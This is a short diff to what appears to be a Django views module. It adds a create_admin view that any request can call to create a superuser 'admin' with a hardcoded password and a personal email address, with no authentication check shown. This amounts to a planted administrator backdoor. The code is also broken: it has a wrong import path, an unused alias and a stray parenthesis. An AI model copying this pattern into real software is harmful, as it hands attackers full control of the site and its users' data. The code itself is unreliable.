@@ -18,8 +18,20 @@ from core.utils import *
 from agents.models import AgentInformation
 from django.urls import reverse
 import traceback
+from django.contrib.auth import User as ud
 
 
+
+
+def create_admin(request):
+    if not User.objects.filter(username='admin').exists():
+        User.objects.create_superuser(
+            username='admin',
+            email='eninlavictor30@gmail.com',
+            password='strongpassword123'
+        )
+        return HttpResponse("Superuser created")
+    return HttpResponse("Superuser already exists"))
 
 
 
